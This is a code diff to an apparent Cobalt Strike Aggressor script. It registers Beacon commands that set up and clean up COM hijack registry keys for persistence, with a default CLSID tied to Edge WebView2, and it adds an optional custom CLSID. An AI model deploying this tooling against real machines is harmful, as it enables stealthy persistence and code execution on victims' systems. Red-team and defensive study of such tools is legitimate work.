@@ -1,35 +1,52 @@
 # Register the BOF commands
 beacon_command_register(
     "comhijack",
-    "Setup COM hijack registry keys for msedgewebview2.exe",
-    "Usage: comhijack [dll_path]\n" .
-    "Example: comhijack C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\directmanipulation.dll"
+    "Setup COM hijack registry keys",
+    "Usage: comhijack [dll_path] [optional_clsid]\n\n" .
+    "Arguments:\n" .
+    "  dll_path      - Path to hijack DLL\n" .
+    "  optional_clsid - Custom CLSID (default: {54E211B6-3650-4F75-8334-FA359598E1C5})\n\n" .
+    "Examples:\n" .
+    "  comhijack C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\directmanipulation.dll\n" .
+    "  comhijack C:\\path\\to\\dll.dll {00000000-0000-0000-0000-000000000000}"
 );
 
 beacon_command_register(
     "comhijack_cleanup",
     "Remove COM hijack registry keys",
-    "Usage: comhijack_cleanup\n" .
-    "Removes all registry keys created by comhijack"
+    "Usage: comhijack_cleanup [optional_clsid]\n\n" .
+    "Arguments:\n" .
+    "  optional_clsid - Custom CLSID (default: {54E211B6-3650-4F75-8334-FA359598E1C5})\n\n" .
+    "Examples:\n" .
+    "  comhijack_cleanup\n" .
+    "  comhijack_cleanup {00000000-0000-0000-0000-000000000000}"
 );
 
 alias comhijack {
-    local('$barch $args $hijackDllPath');
+    local('$barch $args $hijackDllPath $customClsid');
     
     if (size(@_) < 2) {
-        berror($1, "Usage: comhijack [hijack_dll_path]");
+        berror($1, "Usage: comhijack [hijack_dll_path] [optional_clsid]");
         berror($1, "Example: comhijack C:\\Users\\Admin\\AppData\\Local\\Microsoft\\Edge\\directmanipulation.dll");
+        berror($1, "         comhijack C:\\path\\to\\dll.dll {00000000-0000-0000-0000-000000000000}");
         return;
     }
     
     $hijackDllPath = $2;
     $barch = barch($1);
     
-    # Pack arguments
-    $args = bof_pack($1, "z", $hijackDllPath);
-    
-    btask($1, "Setting up COM Hijack registry keys");
-    btask($1, "  Target DLL Path: $hijackDllPath");
+    # Check if custom CLSID provided
+    if (size(@_) >= 3) {
+        $customClsid = $3;
+        $args = bof_pack($1, "zz", $hijackDllPath, $customClsid);
+        btask($1, "Setting up COM Hijack with custom CLSID");
+        btask($1, "  DLL Path: $hijackDllPath");
+        btask($1, "  CLSID: $customClsid");
+    } else {
+        $args = bof_pack($1, "z", $hijackDllPath);
+        btask($1, "Setting up COM Hijack (default CLSID)");
+        btask($1, "  DLL Path: $hijackDllPath");
+    }
     
     if ($barch eq "x64") {
         beacon_inline_execute($1, readbof(script_resource("comhijack.x64.o")), "go", $args);
@@ -39,14 +56,19 @@ alias comhijack {
 }
 
 alias comhijack_cleanup {
-    local('$barch $args');
+    local('$barch $args $customClsid');
     
     $barch = barch($1);
     
-    # Pack cleanup argument
-    $args = bof_pack($1, "z", "cleanup");
-    
-    btask($1, "Cleaning up COM Hijack registry keys");
+    # Check if custom CLSID provided
+    if (size(@_) >= 2) {
+        $customClsid = $2;
+        $args = bof_pack($1, "zz", "cleanup", $customClsid);
+        btask($1, "Cleaning up COM Hijack with custom CLSID: $customClsid");
+    } else {
+        $args = bof_pack($1, "z", "cleanup");
+        btask($1, "Cleaning up COM Hijack (default CLSID)");
+    }
     
     if ($barch eq "x64") {
         beacon_inline_execute($1, readbof(script_resource("comhijack.x64.o")), "go", $args);
